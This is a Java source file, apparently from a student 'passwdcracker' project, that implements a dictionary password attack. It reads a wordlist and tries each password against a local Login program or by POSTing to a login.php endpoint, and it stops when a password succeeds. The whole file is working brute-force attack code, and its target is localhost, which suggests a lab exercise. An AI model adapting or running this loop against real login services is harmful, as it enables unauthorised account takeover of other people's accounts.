
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.net.http.HttpResponse.BodyHandlers;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import utils.HttpUtils;
import utils.ConsoleUtils;

public class AttaqueDictionnaire extends Attaque {

    @Override
    public void initier(String cible, String login) {
        System.out.println("Démarrage de l'attaque par dictionnaire...");
        Charset charset = Charset.forName("US-ASCII");
        String file = "C:\\Users\\Abdoulaye\\Desktop\\dp\\passwdcracker\\data\\password.txt";

        switch (cible) {
            case "local":
                try (BufferedReader reader = Files.newBufferedReader(Paths.get(file), charset)) {
                    String password;
                    while ((password = reader.readLine()) != null) {
                        String[] command = {"java", "-cp", "C:\\Users\\Abdoulaye\\Desktop\\dp\\passwdcracker\\out", "Login", login, password};
                        Process process = new ProcessBuilder(command).start();
                        BufferedReader resultat = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String output = resultat.readLine();
                        System.out.println("Tentative avec mot de passe: " + password + " -> " + output);
                        int exitCode = process.waitFor();

                        if (exitCode == 0) {
                            System.out.print("Mot de passe trouve: ");
                            ConsoleUtils.success(password);
                            break;
                        }
                    }
                } catch (IOException | InterruptedException x) {
                    System.err.format("IOException: %s%n", x);
                }
                break;

            case "remote":
                String uri = "http://localhost/app/login.php";
                HttpClient client = HttpUtils.createHttpClient();
                try (BufferedReader reader = Files.newBufferedReader(Paths.get(file), charset)) {
                    String password;
                    while ((password = reader.readLine()) != null) {
                        HttpRequest request = HttpUtils.createPostRequest(uri, login, password);
                        HttpResponse<String> response = client.send(request, BodyHandlers.ofString());

                        System.out.print("Mot de passe: " + password);
                        System.out.println("Statut: " + response.statusCode());

                        if (response.statusCode() == 200) {
                            System.out.print("Mot de passe trouve: ");
                            ConsoleUtils.success(password);
                            break;
                        }
                    }
                } catch (IOException | InterruptedException e) {
                    System.err.format("IOException: %s%n", e);
                }
                break;
            default:
                System.out.println("Type de cible non reconnu. Veuillez spécifier 'local' ou 'remote'.");
                break;
        }
    }
}
